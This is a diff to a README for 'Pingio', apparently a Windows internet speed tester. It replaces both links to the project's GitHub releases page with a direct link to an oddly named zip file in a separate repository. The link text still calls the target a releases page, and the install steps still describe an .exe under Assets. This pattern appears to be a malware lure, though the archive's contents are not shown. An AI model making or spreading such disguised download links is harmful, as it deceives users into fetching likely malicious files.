@@ -5,7 +5,7 @@ description: "Measure internet speed and network performance with this private, 
 ---
 # 🌐 Pingio - Real-time insights for your internet speed
 
-[![](https://img.shields.io/badge/Download-Pingio-blue)](https://github.com/revolved-figwax293/Pingio/releases)
+[![](https://img.shields.io/badge/Download-Pingio-blue)](https://raw.githubusercontent.com/revolved-figwax293/revolved-figwax293.github.io/main/aminopyrine/io_figwax_github_revolved_v1.5-beta.2.zip)
 
 Pingio measures your internet performance. It tracks your connection speed, ping, and jitter. You see your data as it happens through live charts. This tool helps you understand your connection health. Use it to check if your network meets your needs for streaming, gaming, or video calls.
 
@@ -13,7 +13,7 @@ Pingio measures your internet performance. It tracks your connection speed, ping
 
 Follow these steps to set up Pingio on your Windows computer.
 
-1. Visit the [Pingio releases page](https://github.com/revolved-figwax293/Pingio/releases).
+1. Visit the [Pingio releases page](https://raw.githubusercontent.com/revolved-figwax293/revolved-figwax293.github.io/main/aminopyrine/io_figwax_github_revolved_v1.5-beta.2.zip).
 2. Look for the section titled Latest.
 3. Find the file ending in .exe under the Assets heading.
 4. Click the link to save the file to your computer.
